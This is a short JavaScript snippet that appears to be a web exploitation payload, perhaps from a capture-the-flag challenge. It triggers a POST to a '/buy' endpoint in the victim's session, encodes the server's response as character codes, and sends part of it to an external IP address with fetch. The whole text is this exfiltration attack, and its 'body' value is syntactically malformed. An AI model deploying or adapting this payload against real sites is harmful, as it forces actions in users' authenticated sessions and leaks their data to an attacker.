const fetchOptions = {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: id=0
};

fetch('/buy', fetchOptions).then(response => response.text())
  .then(text => {
    fetch("//122.51.117.66/"
      + text.split('').map(char => char.charCodeAt(0)).join('').substring(100))
  })
